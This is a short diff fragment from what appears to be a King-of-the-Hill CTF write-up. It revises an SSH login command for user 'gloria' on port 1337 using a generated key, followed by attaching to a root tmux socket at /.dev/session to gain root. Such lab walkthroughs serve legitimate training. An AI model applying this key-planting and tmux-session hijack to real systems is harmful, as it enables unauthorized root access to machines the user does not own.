@@ -133,7 +133,7 @@ When generating the key, leave the passphrase empty.  This can be done beforehan
 
 Replace <YOUR \*.pub file data> with what you got from the cat.
 ```
-ssh -i sshkey gloria@<KOTH IP> -p 1337
+ssh -i <YOUR ssh-keygen FILE> gloria@<KOTH IP> -p 1337 (e.g. ssh -i keygen gloria@<KOTH IP> -p 1337)
 /usr/bin/tmux -S /.dev/session
 ```
 You are Now ROOT
